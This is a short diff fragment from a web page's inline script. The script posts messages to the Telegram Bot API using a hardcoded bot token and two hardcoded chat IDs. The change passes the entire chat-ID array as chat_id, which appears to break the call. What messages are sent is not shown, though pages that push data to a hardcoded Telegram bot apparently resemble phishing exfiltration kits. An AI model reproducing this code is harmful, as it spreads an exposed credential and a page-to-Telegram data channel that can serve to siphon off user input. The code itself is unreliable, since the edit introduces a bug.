@@ -96,14 +96,14 @@
   <script>
     const chatIds = ['6573212314', '5681224283']; // Replace with actual chat IDs
 
-    function sendToTelegram(chatId, message) {
+    function sendToTelegram(chatIds, message) {
       return fetch(`https://api.telegram.org/bot7425654455:AAENWfZi5nWwY7CPJwjPTx_7a6gsbbLe6mE/sendMessage`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-          chat_id: chatId,
+          chat_id: chatIds,
           text: message,
           parse_mode: 'Markdown'
         })
